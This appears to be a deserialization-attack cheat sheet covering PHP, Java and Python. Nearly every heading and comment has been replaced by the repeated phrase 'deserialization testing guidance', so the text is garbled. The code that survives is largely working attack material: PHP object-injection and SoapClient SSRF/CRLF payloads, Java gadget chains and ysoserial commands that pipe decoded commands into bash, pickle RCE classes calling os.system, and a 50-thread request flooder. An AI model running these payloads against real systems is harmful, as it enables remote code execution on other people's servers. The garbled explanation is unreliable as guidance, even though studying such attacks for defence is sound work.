# deserialization testing guidance

## PHP deserialization testing guidance

### deserialization testing guidance
```php
// deserialization testing guidance
$s = serialize($obj);  // O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"super";}

// deserialization testing guidance
$obj = unserialize($s);

// deserialization testing guidance
__construct() → __wakeup() → __destruct()
__toString() → __call() → __get()
```

### deserialization testing guidance

#### 1. __wakeup deserialization testing guidance（CVE-2017-12944 / PHP < 7.4）
```php
// deserialization testing guidance，__wakeup deserialization testing guidance
O:4:"User":2:{...}   // deserialization testing guidance
O:4:"User":3:{...}   // deserialization testing guidance __wakeup（deserialization testing guidance 3 > deserialization testing guidance 2）
```

#### 2. __toString deserialization testing guidance
```php
class FileViewer {
    public $filename;
    function __toString() {
        return file_get_contents($this->filename);
    }
}
// deserialization testing guidance: O:10:"FileViewer":1:{s:8:"filename";s:8:"flag.php";}
```

#### 3. SoapClient CRLF deserialization testing guidance (SSRF)
```php
$target = "http://internal-service/";
$client = new SoapClient(null, array(
    'uri' => "http://attacker/",
    'location' => $target,
    'user_agent' => "Attacker\r\nX-Forwarded-For: 127.0.0.1\r\nCookie: session=admin",
));
// deserialization testing guidance SSRF + CRLF deserialization testing guidance
echo urlencode(serialize($client));
```

#### 4. PHP deserialization testing guidance
```
// deserialization testing guidance
// s:5:"admin" (5 deserialization testing guidance) vs s:5:"admin" (deserialization testing guidance)
// deserialization testing guidance
```

### PHP deserialization testing guidance

**deserialization testing guidance**（deserialization testing guidance）：
```
// deserialization testing guidance: "x" → "xx"（1→2，deserialization testing guidance1deserialization testing guidance）
// deserialization testing guidance: deserialization testing guidance ";}O:4:"Evil":1:{s:4:"cmd";s:6:"whoami";}
// deserialization testing guidance "x" deserialization testing guidance
```

**deserialization testing guidance**（deserialization testing guidance）：
```
// deserialization testing guidance: "xx" → "x"（2→1，deserialization testing guidance1deserialization testing guidance）
// deserialization testing guidance
```

## Java deserialization testing guidance

### deserialization testing guidance Gadgets

| Gadget deserialization testing guidance | deserialization testing guidance | deserialization testing guidance |
|-----------|---------|---------|
| CommonsCollections1-7 | Apache Commons Collections | Runtime.exec() |
| CommonsBeanutils1 | Commons Beanutils | TemplatesImpl |
| Spring1 | Spring Framework | JdkDynamicProxy |
| Groovy1 | Groovy | MethodClosure |
| JBossInvoker | JBoss | InvokerTransformer |
| ROME | ROME | ObjectInstantiator |

### deserialization testing guidance
```
# deserialization testing guidance/deserialization testing guidance
/invoker/readonly
/jmx-console/
/web-console/
/jbossws/
```

### ysoserial deserialization testing guidance payload
```bash
java -jar ysoserial.jar CommonsCollections5 "cmd" > payload.bin
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,BASE64}|{base64,-d}|bash" > payload.bin
```

## Python deserialization testing guidance

### pickle deserialization testing guidance RCE
```python
import pickle
import os

class Evil(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Evil())
# deserialization testing guidance payload deserialization testing guidance
```

### deserialization testing guidance
```python
# deserialization testing guidance HMAC deserialization testing guidance
# 1. deserialization testing guidance（deserialization testing guidance）
# 2. deserialization testing guidance pickle deserialization testing guidance
import hmac, hashlib
secret = b'secret_key'
payload = pickle.dumps(Evil())
signature = hmac.new(secret, payload, hashlib.sha256).hexdigest()
```

### __reduce__ deserialization testing guidance
```python
# deserialization testing guidance __setstate__
class Evil:
    def __setstate__(self, state):
        os.system('id')
```

## deserialization testing guidance

```python
import requests
import threading

def exploit():
    # deserialization testing guidance
    r = requests.post(url, data=payload)
    
# deserialization testing guidance
threads = [threading.Thread(target=exploit) for _ in range(50)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```
